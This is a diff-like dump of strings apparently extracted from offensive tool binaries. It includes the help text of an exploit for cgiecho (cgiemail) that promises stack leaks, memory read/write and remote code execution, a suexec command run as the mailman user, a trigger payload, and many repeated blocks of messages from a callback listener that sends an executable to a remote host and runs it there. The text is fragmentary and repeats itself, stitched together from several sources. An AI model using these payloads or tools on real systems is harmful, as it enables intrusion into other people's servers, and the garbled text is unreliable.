@@ -1,0 +1,7409 @@
+help
+SUEXEC=""
+for x in /usr/local/apache/bin/suexec{,.disable}
+    SUEXEC="$x"
+if [ "$SUEXEC" ]
+cat <<"WdURzA" | "$SUEXEC" mailman mailman config_list -c -i /dev/stdin mailman
+execve() filename required.
+prepare_shellcode_fork_exec.c
+help
+execve() filename and/or executable image required.
+prepare_python_fork_exec.c
+Unable to encode executable.
+Usage: %s [--suexec] [--no-base64] [--filename <remote/path/to/exe>] [--executable <local/path/to/exe>] [--stdin <local/path/to/file to put on stdin>] [--argv argv[0] argv[1] ...] [--envp envp[0] envp[1] ...]
+--via-suexec
+--executable
+Filename and/or executable required.
+  sys.exit()
+   os.execve(fn, av, ev)
+    from time import sleep
+    sleep(sc)
+  print 'exec'
+sys.exit()
+(leak_stack) Found return address 0x%08llx at offset %d: identified '%s' executable.
+(leak_stack) No known return address found in stack data: unidentified executable.
+(leak_stack) Executable could not be identified: no target exe dict.
+Unable to set upload option.
+Unable to set upload size.
+Unable to force upload to use GET method.
+Exploit for cgiecho (part of cgiemail) giving info disclosure and memory read/write, enabling remote code execution.
+   the user full control, useful for exploring how a particular executable processes the file.
+   Exploit fprintf() to leak data from the stack. Can be used to fingerprint the target executable
+   If the symbol does not specify the target executable then "this" executable, as determined
+   Specifies a file containing name value mappings for known target executables.
+   Required if --leak-stack is to automatically determine the target executable,
+   Specifies the target executable, if known, using a name from the target exe dict.
+   This allows a guess of 78 (+10=88) to cover the three known 32-bit cPanel cgiecho executables.
+   can be avoided, and execution can potentially be gained with a single request.
+   Specifies the target word size (in bytes) of the target executable. The word size must be known for
+   processed template file. A first-stage shellcode can rewind() the file and read the payload.
+ # Do a GET request, dump stack to determine offset of format string and identify target executable:
+ # With known/guessed stack offset and word size, read copy of target executable from memory:
+ echo -n '[$exec $0<&4 2>&1]' > trigger
+Try --help for more information.
+help
+Cannot resolve symbol '%s': target executable is undetermined.
+sleep
+execlp
+exit
+  -h, --help                                - This help message
+help
+sleep
+execlp
+exit
+execute
+help
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--execute can only be used with --command 0x04
+--start-ish cannot be specified with --execute
+Waiting 10 seconds to invoke Execute Client...
+Execute_transmit() failed
+Execute_initializeClientSession: recv() failed
+Execute_connect: Trying %s:%d...
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_connect: Listening %s:%d
+Execute_connect: Accepted connection %s:%d
+Execute_transmit: recv() failed
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: send() failed
+Execute_connect: bind() failed
+Execute_connect: socket() failed
+Execute_connectlisten() failed
+Execute_connect: accept() failed
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_UNKNOWN
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_SOCKET
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+Execute_transmit: Execution error: The execl() system call failed: %s.
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_LISTEN
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+Executable format error
+EXECUTE_ERROR_VERIEXEC
+sleep
+execlp
+exit
+help
+  -h, --help                                - This help message
+exit
+execlp
+sleep
+  -h, --help                                - This help message
+help
+sleep
+execlp
+exit
+execute
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--start-ish cannot be specified with --execute
+--execute can only be used with --command 0x04
+Waiting %i seconds to invoke Execute Client...
+Execute_transmit() failed
+help
+Execute_initializeClientSession: recv() failed
+Execute_connect: socket() failed
+Execute_connect: bind() failed
+Execute_connectlisten() failed
+Execute_connect: Listening %s:%d
+Execute_connect: accept() failed
+Execute_connect: Accepted connection %s:%d
+Execute_connect: Trying %s:%d...
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: recv() failed
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: send() failed
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Executable format error
+Execute_transmit: Execution error: The execl() system call failed: %s (%u).
+EXECUTE_ERROR_UNKNOWN
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_SOCKET
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_LISTEN
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_VERIEXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+usleep
+execlp
+exit
+help
+  -h --help                         - This help message
+sleep
+execlp
+exit
+execute
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--start-ish cannot be specified with --execute
+--execute can only be used with --command 0x04
+Waiting %i seconds to invoke Execute Client...
+Execute_transmit() failed
+help
+Execute_initializeClientSession: recv() failed
+Execute_connect: socket() failed
+Execute_connect: bind() failed
+Execute_connectlisten() failed
+Execute_connect: Listening %s:%d
+Execute_connect: accept() failed
+Execute_connect: Accepted connection %s:%d
+Execute_connect: Trying %s:%d...
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: recv() failed
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: send() failed
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Executable format error
+Execute_transmit: Execution error: The execl() system call failed: %s (%u).
+EXECUTE_ERROR_UNKNOWN
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_SOCKET
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_LISTEN
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_VERIEXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+sleep
+execlp
+exit
+execute
+help
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--execute can only be used with --command 0x04
+--start-ish cannot be specified with --execute
+Waiting 10 seconds to invoke Execute Client...
+Execute_transmit() failed
+Execute_initializeClientSession: recv() failed
+Execute_connect: Trying %s:%d...
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_connect: Listening %s:%d
+Execute_connect: Accepted connection %s:%d
+Execute_transmit: recv() failed
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: send() failed
+Execute_connect: bind() failed
+Execute_connect: socket() failed
+Execute_connectlisten() failed
+Execute_connect: accept() failed
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_UNKNOWN
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_SOCKET
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+Execute_transmit: Execution error: The execl() system call failed: %s.
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_LISTEN
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+Executable format error
+EXECUTE_ERROR_VERIEXEC
+sleep
+execlp
+exit
+help
+  -h, --help                                - This help message
+sleep
+execlp
+exit
+execute
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--start-ish cannot be specified with --execute
+--execute can only be used with --command 0x04
+Waiting %i seconds to invoke Execute Client...
+Execute_transmit() failed
+help
+Execute_initializeClientSession: recv() failed
+Execute_connect: socket() failed
+Execute_connect: bind() failed
+Execute_connectlisten() failed
+Execute_connect: Listening %s:%d
+Execute_connect: accept() failed
+Execute_connect: Accepted connection %s:%d
+Execute_connect: Trying %s:%d...
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: recv() failed
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: send() failed
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Executable format error
+Execute_transmit: Execution error: The execl() system call failed: %s (%u).
+EXECUTE_ERROR_UNKNOWN
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_SOCKET
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_LISTEN
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_VERIEXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+EXECUTE_ERROR_FCHMOD
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+sleep
+execlp
+exit
+execute
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--start-ish cannot be specified with --execute
+--execute can only be used with --command 0x04
+Waiting %i seconds to invoke Execute Client...
+Execute_transmit() failed
+help
+Execute_initializeClientSession: recv() failed
+Execute_connect: socket() failed
+Execute_connect: bind() failed
+Execute_connectlisten() failed
+Execute_connect: Listening %s:%d
+Execute_connect: accept() failed
+Execute_connect: Accepted connection %s:%d
+Execute_connect: Trying %s:%d...
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: recv() failed
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: send() failed
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Executable format error
+Execute_transmit: Execution error: The execl() system call failed: %s (%u).
+EXECUTE_ERROR_UNKNOWN
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_SOCKET
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_LISTEN
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_VERIEXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+sleep
+execlp
+exit
+execute
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--start-ish cannot be specified with --execute
+--execute can only be used with --command 0x04
+Waiting 10 seconds to invoke Execute Client...
+Execute_transmit() failed
+help
+Execute_initializeClientSession: recv() failed
+Execute_connect: socket() failed
+Execute_connect: bind() failed
+Execute_connectlisten() failed
+Execute_connect: Listening %s:%d
+Execute_connect: accept() failed
+Execute_connect: Accepted connection %s:%d
+Execute_connect: Trying %s:%d...
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: recv() failed
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: send() failed
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Executable format error
+Execute_transmit: Execution error: The execl() system call failed: %s (%u).
+EXECUTE_ERROR_UNKNOWN
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_SOCKET
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_LISTEN
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_VERIEXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+sleep
+execlp
+exit
+execute
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--start-ish cannot be specified with --execute
+--execute can only be used with --command 0x04
+Waiting 10 seconds to invoke Execute Client...
+Execute_transmit() failed
+help
+Execute_initializeClientSession: recv() failed
+Execute_connect: socket() failed
+Execute_connect: bind() failed
+Execute_connectlisten() failed
+Execute_connect: Listening %s:%d
+Execute_connect: accept() failed
+Execute_connect: Accepted connection %s:%d
+Execute_connect: Trying %s:%d...
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: recv() failed
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: send() failed
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Executable format error
+Execute_transmit: Execution error: The execl() system call failed: %s (%u).
+EXECUTE_ERROR_UNKNOWN
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_SOCKET
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_LISTEN
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_VERIEXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+sleep
+execlp
+exit
+execute
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--start-ish cannot be specified with --execute
+--execute can only be used with --command 0x04
+Waiting %i seconds to invoke Execute Client...
+Execute_transmit() failed
+help
+Execute_initializeClientSession: recv() failed
+Execute_connect: socket() failed
+Execute_connect: bind() failed
+Execute_connectlisten() failed
+Execute_connect: Listening %s:%d
+Execute_connect: accept() failed
+Execute_connect: Accepted connection %s:%d
+Execute_connect: Trying %s:%d...
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: recv() failed
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: send() failed
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Executable format error
+Execute_transmit: Execution error: The execl() system call failed: %s (%u).
+EXECUTE_ERROR_UNKNOWN
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_SOCKET
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_LISTEN
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_VERIEXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+EXECUTE_ERROR_FCHMOD
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+sleep
+execlp
+exit
+  -h, --help                                - This help message
+help
+sleep
+execlp
+exit
+help
+  -h, --help                                - This help message
+sleep
+execlp
+exit
+execute
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--start-ish cannot be specified with --execute
+--execute can only be used with --command 0x04
+Waiting 10 seconds to invoke Execute Client...
+Execute_transmit() failed
+help
+Execute_initializeClientSession: recv() failed
+Execute_connect: socket() failed
+Execute_connect: bind() failed
+Execute_connectlisten() failed
+Execute_connect: Listening %s:%d
+Execute_connect: accept() failed
+Execute_connect: Accepted connection %s:%d
+Execute_connect: Trying %s:%d...
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: recv() failed
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: send() failed
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Executable format error
+Execute_transmit: Execution error: The execl() system call failed: %s (%u).
+EXECUTE_ERROR_UNKNOWN
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_SOCKET
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_LISTEN
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_VERIEXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+sleep
+execlp
+exit
+execute
+help
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--execute can only be used with --command 0x04
+--start-ish cannot be specified with --execute
+Waiting 10 seconds to invoke Execute Client...
+Execute_transmit() failed
+Execute_initializeClientSession: recv() failed
+Execute_connect: Trying %s:%d...
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_connect: Listening %s:%d
+Execute_connect: Accepted connection %s:%d
+Execute_transmit: recv() failed
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: send() failed
+Execute_connect: bind() failed
+Execute_connect: socket() failed
+Execute_connectlisten() failed
+Execute_connect: accept() failed
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_UNKNOWN
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_SOCKET
+Execute_transmit: Execution error: The execl() system call failed: %s (%u).
+EXECUTE_ERROR_LISTEN
+Executable format error
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+EXECUTE_ERROR_VERIEXEC
+sleep
+execlp
+exit
+execute
+help
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--execute can only be used with --command 0x04
+--start-ish cannot be specified with --execute
+Waiting 10 seconds to invoke Execute Client...
+Execute_transmit() failed
+Execute_initializeClientSession: recv() failed
+Execute_connect: Trying %s:%d...
+Execute_transmit: unsupported server side protocol version: 0x%x
+Execute_connect: Listening %s:%d
+Execute_connect: Accepted connection %s:%d
+Execute_transmit: recv() failed
+Execute_connect: connect() failed
+Execute_connect: Sleeping 5...
+Execute_transmit: Received platform information:
+Execute_transmit: Calculated Adler32 0x%08x
+Execute_transmit: Sending %d bytes...
+Execute_transmit: Sent %u bytes
+Execute_transmit: send() failed
+Execute_connect: bind() failed
+Execute_connect: socket() failed
+Execute_connectlisten() failed
+Execute_connect: accept() failed
+Execute_transmit: Server calculated Adler32 0x%08x
+Execute_transmit: Server received corrupted data! Aborting operation...
+EXECUTE_ERROR_READLINK
+EXECUTE_ERROR_ACCEPT
+EXECUTE_ERROR_MEM_ALLOC
+EXECUTE_ERROR_UNKNOWN
+Execute_transmit: Execution error: %s
+Execute_transmit: done
+Execute_transmit: Forked process %u, "%s".  Return Code = 0x%02x
+Execute_transmit: Forked process %u, "%s" did not terminate before status information could be read.
+Execute_transmit: Forked process %u, "%s" terminated abnormally.
+EXECUTE_ERROR_RECV
+EXECUTE_ERROR_CONNECT
+EXECUTE_ERROR_SEND
+EXECUTE_ERROR_VERSION
+EXECUTE_ERROR_DUP
+EXECUTE_ERROR_STAT
+EXECUTE_ERROR_PIPE
+EXECUTE_ERROR_WRITE
+EXECUTE_ERROR_OPEN
+EXECUTE_ERROR_FORK
+EXECUTE_ERROR_FCNTL
+EXECUTE_ERROR_BIND
+EXECUTE_ERROR_SOCKET
+EXECUTE_ERROR_ENTRY
+EXECUTE_ERROR_CHECKSUM
+EXECUTE_ERROR_LINK
+Execute_transmit: Execution error: The execl() system call failed: %s.
+EXECUTE_ERROR_READ
+EXECUTE_ERROR_LISTEN
+EXECUTE_ERROR_EXEC
+EXECUTE_ERROR_PROCESS_TERMINATE
+EXECUTE_ERROR_PROCESS_TIMEOUT
+Executable format error
+EXECUTE_ERROR_VERIEXEC
+sleep
+execlp
+exit
+help
+  -h, --help                                - This help message
+sleep
+execlp
+exit
+execute
+  -x, --execute file                        - Use command 0x04 and start execute call back listener with given file
+  -h, --help                                - This help message
+--start-ish cannot be specified with --execute
+--execute can only be used with --command 0x04
+Waiting %i seconds to invoke Execute Client...
+Execute_transmit() failed
+help
